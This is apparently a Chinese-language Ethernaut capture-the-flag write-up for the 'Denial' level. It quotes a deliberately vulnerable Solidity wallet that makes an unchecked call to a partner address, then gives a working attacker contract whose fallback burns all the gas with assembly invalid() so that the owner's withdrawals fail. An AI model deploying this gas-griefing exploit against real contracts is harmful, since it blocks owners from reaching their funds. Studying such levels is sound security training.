# 20-Denial

日期: 23/08/2024
难易: 简单
漏洞小结: 拒绝攻击
简单明了: 通过消耗gas达到拒绝攻击的目的

# 问题描述

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

# 攻击思路

1. 通过攻击合约，把partner设置成我们的攻击合约
2. 因为`partner.call{value: amountToSend}("");`，会调用`receive`或者`fallback`函数
3. 在函数里面把gas消耗光，拒绝服务
    1. 一开始想用`revert`，但是发现是做不到的

# 攻击方式

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract AttackDenial {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        // Burn all gas - same as assert(false) in Solidity < 0.8
        assembly {
            invalid()
        }
    }
}
```

# Ethernuat总结

# 小白的思考

- 仔细分析一波还是很简单的
- 需要了解0.8.0前后消耗攻击函数的不同

```solidity
    fallback() external payable {
        // Burn all gas - same as assert(false) in Solidity < 0.8
        assembly {
            invalid()
        }
    }
```

- 进一步思考，上面这么做是因为cal没有返回bool的值
    - 一般性会require操作成功，bool返回true，有个require在那边，那么可以用revert实现